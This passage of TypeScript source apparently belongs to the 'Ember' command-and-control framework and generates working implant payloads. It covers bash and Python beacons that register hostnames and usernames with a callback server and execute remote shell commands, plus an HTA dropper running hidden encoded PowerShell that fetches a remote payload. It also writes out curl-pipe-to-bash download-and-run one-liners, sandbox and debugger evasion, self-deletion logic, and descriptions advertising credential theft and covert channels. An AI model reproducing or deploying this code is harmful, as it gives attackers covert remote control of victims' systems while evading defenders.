  const payload = `${sandboxCheck}(C="${callbackUrl}";T="${regToken}";I=${interval};J=${jitter};H=\$(hostname);U=\$(whoami);A=\$(uuidgen 2>/dev/null||cat /proc/sys/kernel/random/uuid);curl -s -X POST "$C/api/ember/register" -H 'Content-Type: application/json' -d "{\\"agentId\\":\\"$A\\",\\"name\\":\\"ember-$H\\",\\"token\\":\\"$T\\",\\"hostname\\":\\"$H\\",\\"username\\":\\"$U\\",\\"platform\\":\\"linux\\",\\"profile\\":\\"${config.profile}\\"}";while true;do R=\$(curl -s -X POST "$C/api/ember/beacon" -H 'Content-Type: application/json' -d "{\\"agentId\\":\\"$A\\",\\"state\\":\\"active\\",\\"timestamp\\":\$(date +%s%3N)}");echo "$R"|python3 -c "import sys,json;[__import__('subprocess').run(t['params'].get('command',''),shell=True,capture_output=True) for t in json.load(sys.stdin).get('tasks',[])]" 2>/dev/null;S=\$((I+RANDOM%((I*J/50))-I*J/100));sleep $S;done)&`;

  return {
    payload,
    format: "bash_oneliner",
    filename: "ember-stager.sh",
    contentType: "text/plain",
    size: Buffer.byteLength(payload),
    hash: simpleHash(payload),
    oneLiner: `bash -c '\${payload.replace(/'/g, "'\\''")}'`,
    capabilities: ["beacon", "shell_exec", "self_register", "background_exec"],
    evasionTechniques: [
      ...(config.evasion.sandboxDetection ? ["sandbox_detection"] : []),
      "background_process",
      "jittered_beacon",
    ],
    estimatedDetectionRate: Math.max(15, 55 - config.evasion.obfuscationLevel * 8),
    generatedAt: Date.now(),
  };
}

function generateBashScript(config: EmberPayloadConfig): EmberPayloadOutput {
  const callbackUrl = config.callback.urls[0];
  const fallbackUrls = config.callback.urls.slice(1);

  const script = `#!/bin/bash
# Ember Agent — AC3 Proprietary
# Profile: ${config.profile} | Platform: ${config.platform}
# Generated: ${new Date().toISOString()}
# Classification: PROPRIETARY — AC3 Internal Use Only

set -euo pipefail

# ─── Configuration ───
CALLBACK_URLS=("${callbackUrl}"${fallbackUrls.map(u => ` "\${u}"`).join("")})
REG_TOKEN="${config.registrationToken}"
PROFILE="${config.profile}"
BEACON_INTERVAL=${config.beacon.intervalSeconds}
JITTER_PERCENT=${config.beacon.jitterPercent}
KILL_DATE=${config.beacon.killDate || 0}
CURRENT_URL_IDX=0

# ─── Evasion Checks ───
${config.evasion.sandboxDetection ? `
check_sandbox() {
    local mem_kb=\$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
    [ "\${mem_kb:-0}" -lt 1000000 ] && exit 0
    local cpu_count=\$(nproc 2>/dev/null || echo 1)
    [ "$cpu_count" -lt 2 ] && exit 0
    local uptime_sec=\$(awk '{print int($1)}' /proc/uptime 2>/dev/null || echo 999)
    [ "$uptime_sec" -lt 300 ] && sleep 300
}
check_sandbox` : "# Sandbox detection disabled"}

${config.evasion.antiDebugging ? `
check_debugger() {
    if grep -q TracerPid /proc/self/status 2>/dev/null; then
        local tracer=\$(grep TracerPid /proc/self/status | awk '{print $2}')
        [ "$tracer" -ne 0 ] && exit 0
    fi
}
check_debugger` : "# Anti-debug disabled"}

# ─── System Enumeration ───
get_system_info() {
    local hostname=\$(hostname)
    local username=\$(whoami)
    local platform="linux"
    local arch=\$(uname -m)
    local os_version=\$(uname -r)
    local pid=$$
    local process_name=\$(basename "$0")
    local is_elevated=false
    [ "\$(id -u)" -eq 0 ] && is_elevated=true

    cat <<EOF
{
    "hostname": "$hostname",
    "username": "$username",
    "platform": "$platform",
    "architecture": "$arch",
    "osVersion": "$os_version",
    "pid": $pid,
    "processName": "$process_name",
    "isElevated": $is_elevated,
    "integrity": "\$([ "\$(id -u)" -eq 0 ] && echo 'high' || echo 'medium')",
    "networkInterfaces": [\$(ip -4 addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print "{\\"name\\": \\""$NF"\\", \\"ipv4\\": \\""$2"\\"}" }' | paste -sd, || echo '')]
}
EOF
}

# ─── Beacon Functions ───
AGENT_ID=\$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "ember-\$(date +%s)-$$")
SEQUENCE=0

http_post() {
    local url="$1" data="$2"
    curl -s -X POST "$url" -H 'Content-Type: application/json' -d "$data" --connect-timeout 10 --max-time 30 2>/dev/null
}

register_agent() {
    local sys_info=\$(get_system_info)
    local body="{\\"agentId\\":\\"$AGENT_ID\\",\\"name\\":\\"ember-\$(hostname)\\",\\"token\\":\\"$REG_TOKEN\\",\\"profile\\":\\"$PROFILE\\",\\"interval\\":$BEACON_INTERVAL,\\"jitter\\":$JITTER_PERCENT,\\"systemInfo\\":$sys_info}"

    for i in "\${!CALLBACK_URLS[@]}"; do
        local resp=\$(http_post "\${CALLBACK_URLS[$i]}/api/ember/register" "$body")
        if echo "$resp" | grep -q "agentId"; then
            CURRENT_URL_IDX=$i
            return 0
        fi
    done
    return 1
}

send_beacon() {
    SEQUENCE=\$((SEQUENCE + 1))
    local ts=\$(date +%s%3N 2>/dev/null || echo \$((\$(date +%s) * 1000)))
    local body="{\\"agentId\\":\\"$AGENT_ID\\",\\"sequence\\":$SEQUENCE,\\"state\\":\\"active\\",\\"timestamp\\":$ts,\\"channel\\":\\"https_beacon\\"}"
    local url="\${CALLBACK_URLS[$CURRENT_URL_IDX]}"
    http_post "$url/api/ember/beacon" "$body"
}

execute_task() {
    local task_json="$1"
    local task_id=\$(echo "$task_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('taskId',''))" 2>/dev/null)
    local task_type=\$(echo "$task_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('type',''))" 2>/dev/null)
    local output="" status="failed" error=""

    case "$task_type" in
        shell_command)
            local cmd=\$(echo "$task_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('params',{}).get('command',''))" 2>/dev/null)
            output=\$(eval "$cmd" 2>&1) && status="success" || error="Command failed"
            ;;
        sleep_update)
            BEACON_INTERVAL=\$(echo "$task_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('params',{}).get('interval',$BEACON_INTERVAL))" 2>/dev/null)
            JITTER_PERCENT=\$(echo "$task_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('params',{}).get('jitter',$JITTER_PERCENT))" 2>/dev/null)
            status="success"
            output="Beacon updated: interval=\${BEACON_INTERVAL}s jitter=\${JITTER_PERCENT}%"
            ;;
        self_destruct)
            rm -f "$0" 2>/dev/null
            exit 0
            ;;
        *)
            output="Unsupported task type: $task_type"
            ;;
    esac

    local url="\${CALLBACK_URLS[$CURRENT_URL_IDX]}"
    local result="{\\"taskId\\":\\"$task_id\\",\\"agentId\\":\\"$AGENT_ID\\",\\"status\\":\\"$status\\",\\"output\\":\\"\$(echo "$output" | head -c 4000 | sed 's/"/\\\\"/g; s/$/\\\\n/' | tr -d '\\n')\\"}"
    http_post "$url/api/ember/result" "$result"
}

# ─── Main Loop ───
${config.evasion.initialSleepMs > 0 ? `sleep \$((${config.evasion.initialSleepMs} / 1000))` : ""}

register_agent || exit 1

while true; do
    # Kill date check
    if [ $KILL_DATE -gt 0 ]; then
        local now_ms=\$(date +%s%3N 2>/dev/null || echo \$((\$(date +%s) * 1000)))
        [ "$now_ms" -gt "$KILL_DATE" ] && rm -f "$0" 2>/dev/null && exit 0
    fi

    resp=\$(send_beacon)

    # Process tasks
    if echo "$resp" | python3 -c "import sys,json;d=json.load(sys.stdin);exit(0 if d.get('tasks') else 1)" 2>/dev/null; then
        echo "$resp" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for task in data.get('tasks', []):
    print(json.dumps(task))
" 2>/dev/null | while read -r task_line; do
            execute_task "$task_line"
        done
    fi

    # Jittered sleep
    jitter_range=\$((BEACON_INTERVAL * JITTER_PERCENT / 100))
    [ "$jitter_range" -lt 1 ] && jitter_range=1
    sleep_time=\$((BEACON_INTERVAL + RANDOM % (jitter_range * 2) - jitter_range))
    [ "$sleep_time" -lt 1 ] && sleep_time=1
    sleep "$sleep_time"
done
`;

  return {
    payload: script,
    format: "bash_script",
    filename: `ember-${config.profile}-\${Date.now().toString(36)}.sh`,
    contentType: "text/plain",
    size: Buffer.byteLength(script),
    hash: simpleHash(script),
    oneLiner: `curl -s ${callbackUrl}/api/ember/payload/${config.registrationToken} | bash`,
    capabilities: ["beacon", "shell_exec", "self_register", "kill_date", "channel_failover", "system_enum"],
    evasionTechniques: [
      ...(config.evasion.sandboxDetection ? ["sandbox_detection", "memory_check", "cpu_check"] : []),
      ...(config.evasion.antiDebugging ? ["ptrace_check"] : []),
      "jittered_beacon",
      "multi_callback_failover",
    ],
    estimatedDetectionRate: Math.max(5, 45 - config.evasion.obfuscationLevel * 7),
    generatedAt: Date.now(),
  };
}

// ─── Python Stager ──────────────────────────────────────────────────────────

function generatePythonStager(config: EmberPayloadConfig): EmberPayloadOutput {
  const callbackUrl = config.callback.urls[0];

  const script = `#!/usr/bin/env python3
# Ember Agent — AC3 Proprietary
# Profile: ${config.profile} | Platform: ${config.platform}
import os,sys,json,time,uuid,socket,platform,subprocess,urllib.request,urllib.error

C="${callbackUrl}"
T="${config.registrationToken}"
I=${config.beacon.intervalSeconds}
J=${config.beacon.jitterPercent}
P="${config.profile}"

def sysinfo():
    return {"hostname":socket.gethostname(),"username":os.getenv("USER",os.getenv("USERNAME","unknown")),"platform":sys.platform,"architecture":platform.machine(),"osVersion":platform.release(),"pid":os.getpid(),"processName":sys.argv[0],"isElevated":os.getuid()==0 if hasattr(os,"getuid") else False,"integrity":"high" if (hasattr(os,"getuid") and os.getuid()==0) else "medium","networkInterfaces":[],"securityProducts":[]}

def post(url,data):
    req=urllib.request.Request(url,json.dumps(data).encode(),{"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(req,timeout=30) as r:return json.loads(r.read())
    except:return{}

aid=str(uuid.uuid4())
si=sysinfo()
post(f"{C}/api/ember/register",{"agentId":aid,"name":f"ember-{si['hostname']}","token":T,"profile":P,"interval":I,"jitter":J,"systemInfo":si})
seq=0
while True:
    seq+=1
    try:
        r=post(f"{C}/api/ember/beacon",{"agentId":aid,"sequence":seq,"state":"active","timestamp":int(time.time()*1000),"channel":"https_beacon"})
        for t in r.get("tasks",[]):
            tid,tp=t["taskId"],t["type"]
            out,st,err="","failed",""
            try:
                if tp=="shell_command":
                    p=subprocess.run(t["params"]["command"],shell=True,capture_output=True,text=True,timeout=300)
                    out,st=p.stdout+p.stderr,"success"
                elif tp=="self_destruct":
                    try:os.remove(__file__)
                    except:pass
                    sys.exit(0)
                elif tp=="sleep_update":
                    I,J=t["params"].get("interval",I),t["params"].get("jitter",J)
                    st,out="success",f"Updated: interval={I}s jitter={J}%"
            except Exception as e:err=str(e)
            post(f"{C}/api/ember/result",{"taskId":tid,"agentId":aid,"status":st,"output":out[:4000],"error":err})
    except:pass
    import random;time.sleep(max(1,I+random.randint(-I*J//100,I*J//100)))
`;

  return {
    payload: script,
    format: "python_stager",
    filename: `ember-${config.profile}-${Date.now().toString(36)}.py`,
    contentType: "text/x-python",
    size: Buffer.byteLength(script),
    hash: simpleHash(script),
    oneLiner: `python3 -c "$(curl -s ${callbackUrl}/api/ember/payload/${config.registrationToken})"`,
    capabilities: ["beacon", "shell_exec", "self_register", "cross_platform"],
    evasionTechniques: ["jittered_beacon", "no_external_dependencies"],
    estimatedDetectionRate: Math.max(10, 40 - config.evasion.obfuscationLevel * 6),
    generatedAt: Date.now(),
  };
}

// ─── Stub Generators (for formats that need compilation) ────────────────────

function generateDLLStub(config: EmberPayloadConfig): EmberPayloadOutput {
  return createStubOutput(config, "dll_sideload", "ember-sideload.dll", "application/x-msdownload",
    ["dll_sideload", "process_injection"], ["dll_sideloading", "export_forwarding"]);
}

function generateMSIStub(config: EmberPayloadConfig): EmberPayloadOutput {
  return createStubOutput(config, "msi_installer", "ember-installer.msi", "application/x-msi",
    ["msi_install", "service_persistence"], ["signed_package", "custom_action"]);
}

function generateHTADropper(config: EmberPayloadConfig): EmberPayloadOutput {
  const callbackUrl = config.callback.urls[0];
  const hta = `<html><head><HTA:APPLICATION ID="Ember" APPLICATIONNAME="System Update" SHOWINTASKBAR="no" WINDOWSTATE="minimize"/></head><body><script language="VBScript">
Set s=CreateObject("WScript.Shell"):s.Run "powershell -nop -w hidden -enc ${Buffer.from(`IEX(IWR '${callbackUrl}/api/ember/payload/${config.registrationToken}' -UseBasicParsing).Content`).toString("base64")}",0:Close
</script></body></html>`;

  return {
    payload: hta,
    format: "hta_dropper",
    filename: `system-update-${Date.now().toString(36)}.hta`,
    contentType: "application/hta",
    size: Buffer.byteLength(hta),
    hash: simpleHash(hta),
    capabilities: ["dropper", "powershell_exec"],
    evasionTechniques: ["hta_execution", "hidden_window", "encoded_payload"],
    estimatedDetectionRate: 45,
    generatedAt: Date.now(),
  };
}

function generateMacroStub(config: EmberPayloadConfig): EmberPayloadOutput {
  return createStubOutput(config, "macro_document", "ember-doc.docm", "application/vnd.ms-word.document.macroEnabled.12",
    ["macro_exec", "dropper"], ["auto_open_macro", "obfuscated_vba"]);
}

function generateISOStub(config: EmberPayloadConfig): EmberPayloadOutput {
  return createStubOutput(config, "iso_container", "ember-archive.iso", "application/x-iso9660-image",
    ["iso_mount", "lnk_exec"], ["motw_bypass", "hidden_files"]);
}

function generateLNKStub(config: EmberPayloadConfig): EmberPayloadOutput {
  return createStubOutput(config, "lnk_shortcut", "Document.lnk", "application/x-ms-shortcut",
    ["lnk_exec", "powershell_exec"], ["icon_masquerade", "hidden_args"]);
}

function generateServiceExeStub(config: EmberPayloadConfig): EmberPayloadOutput {
  return createStubOutput(config, "service_executable", "ember-svc.exe", "application/x-msdownload",
    ["service_install", "persistence", "beacon"], ["service_masquerade", "signed_binary"]);
}

function generateELFStub(config: EmberPayloadConfig): EmberPayloadOutput {
  return createStubOutput(config, "elf_binary", "ember-agent", "application/x-executable",
    ["beacon", "shell_exec", "persistence"], ["stripped_binary", "anti_debug", "ptrace_check"]);
}

function generateShellcodeStub(config: EmberPayloadConfig): EmberPayloadOutput {
  return createStubOutput(config, "shellcode_raw", "ember-shellcode.bin", "application/octet-stream",
    ["shellcode_inject", "pic_exec"], ["position_independent", "null_free", "xor_encoded"]);
}

function generateBOFStub(config: EmberPayloadConfig): EmberPayloadOutput {
  return createStubOutput(config, "bof_module", "ember-module.o", "application/octet-stream",
    ["bof_exec", "in_process"], ["coff_object", "no_new_process"]);
}

function createStubOutput(
  config: EmberPayloadConfig,
  format: EmberPayloadFormat,
  filename: string,
  contentType: string,
  capabilities: string[],
  evasionTechniques: string[],
): EmberPayloadOutput {
  const stub = `[Ember ${format} payload — requires compilation pipeline]\nProfile: ${config.profile}\nPlatform: ${config.platform}\nCallback: ${config.callback.urls[0]}\nGenerated: ${new Date().toISOString()}`;
  return {
    payload: stub,
    format,
    filename,
    contentType,
    size: Buffer.byteLength(stub),
    hash: simpleHash(stub),
    capabilities,
    evasionTechniques,
    estimatedDetectionRate: Math.max(5, 30 - config.evasion.obfuscationLevel * 5),
    generatedAt: Date.now(),
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// §13 — UTILITY FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════════

function simpleHash(input: string): string {
  let hash = 0;
  for (let i = 0; i < input.length; i++) {
    const char = input.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash |= 0;
  }
  return Math.abs(hash).toString(16).padStart(16, "0");
}

// ─── Singleton Manager ──────────────────────────────────────────────────────

let _manager: EmberAgentManager | null = null;

export function getEmberAgentManager(): EmberAgentManager {
  if (!_manager) _manager = new EmberAgentManager();
  return _manager;
}

export function resetEmberAgentManager(): void {
  _manager = null;
}

// ─── Profile Descriptions ───────────────────────────────────────────────────

export const EMBER_PROFILE_DESCRIPTIONS: Record<EmberProfile, {
  label: string;
  description: string;
  capabilities: string[];
  stealthRating: number;
  footprintKb: number;
}> = {
  ghost: {
    label: "Ghost",
    description: "Minimal footprint beacon-only agent. Maximum evasion with no offensive tools. Ideal for long-term persistent access and monitoring.",
    capabilities: ["beacon", "system_enum", "channel_switch"],
    stealthRating: 95,
    footprintKb: 8,
  },
  scout: {
    label: "Scout",
    description: "Reconnaissance-focused agent with passive and active network mapping. Discovers hosts, services, and attack surface without exploitation.",
    capabilities: ["beacon", "system_enum", "network_map", "service_fingerprint", "ad_enum", "cloud_metadata"],
    stealthRating: 80,
    footprintKb: 24,
  },
  striker: {
    label: "Striker",
    description: "Full offensive toolkit for exploitation, credential access, and post-exploitation. Designed for active red team operations.",
    capabilities: ["beacon", "system_enum", "shell_exec", "file_ops", "cred_dump", "token_theft", "process_inject", "privesc", "lateral_move"],
    stealthRating: 50,
    footprintKb: 64,
  },
  sentinel: {
    label: "Sentinel",
    description: "Long-term persistence agent with multiple persistence mechanisms and self-healing. Maintains access across reboots and updates.",
    capabilities: ["beacon", "system_enum", "persistence", "self_heal", "watchdog", "update"],
    stealthRating: 85,
    footprintKb: 32,
  },
  hydra: {
    label: "Hydra",
    description: "Swarm coordination node that manages multi-agent operations. Distributes tasks, shares intelligence, and coordinates collective evasion.",
    capabilities: ["beacon", "system_enum", "swarm_coord", "p2p_mesh", "task_distribute", "intel_share", "collective_evasion"],
    stealthRating: 70,
    footprintKb: 48,
  },
};

// ─── Channel Descriptions ───────────────────────────────────────────────────

export const EMBER_CHANNEL_DESCRIPTIONS: Record<EmberChannelType, {
  label: string;
  description: string;
  stealthRating: number;
  bandwidth: "low" | "medium" | "high";
  latency: "low" | "medium" | "high";
  reliability: number;
}> = {
  https_beacon: {
    label: "HTTPS Beacon",
    description: "Standard HTTPS communication with malleable traffic profiles. Blends with normal web traffic.",
    stealthRating: 70, bandwidth: "high", latency: "low", reliability: 95,
  },
  dns_covert: {
    label: "DNS Covert Channel",
    description: "Encodes data in DNS queries and responses. Very stealthy but low bandwidth.",
    stealthRating: 90, bandwidth: "low", latency: "high", reliability: 85,
  },
  doh_tunnel: {
    label: "DNS-over-HTTPS Tunnel",
    description: "Tunnels data through DNS-over-HTTPS requests to public resolvers. Appears as legitimate encrypted DNS.",
    stealthRating: 95, bandwidth: "low", latency: "medium", reliability: 90,
  },
  websocket_stream: {
    label: "WebSocket Stream",
    description: "Persistent WebSocket connection for real-time interactive sessions. High bandwidth but more detectable.",
    stealthRating: 60, bandwidth: "high", latency: "low", reliability: 80,
  },
  icmp_covert: {
    label: "ICMP Covert Channel",
    description: "Hides data in ICMP echo request/reply payloads. Bypasses many firewalls.",
    stealthRating: 75, bandwidth: "low", latency: "medium", reliability: 70,
  },
  smb_named_pipe: {
    label: "SMB Named Pipe",
    description: "Uses SMB named pipes for internal lateral communication. Blends with Windows domain traffic.",
    stealthRating: 80, bandwidth: "medium", latency: "low", reliability: 85,
  },
  steganography: {
    label: "Steganographic Channel",
    description: "Embeds data in images uploaded/downloaded from legitimate services. Extremely stealthy.",
    stealthRating: 98, bandwidth: "low", latency: "high", reliability: 75,
  },
  p2p_mesh: {
    label: "P2P Mesh Network",
    description: "Peer-to-peer communication between Ember agents. No direct C2 contact needed for interior agents.",
    stealthRating: 85, bandwidth: "medium", latency: "medium", reliability: 80,
  },
};
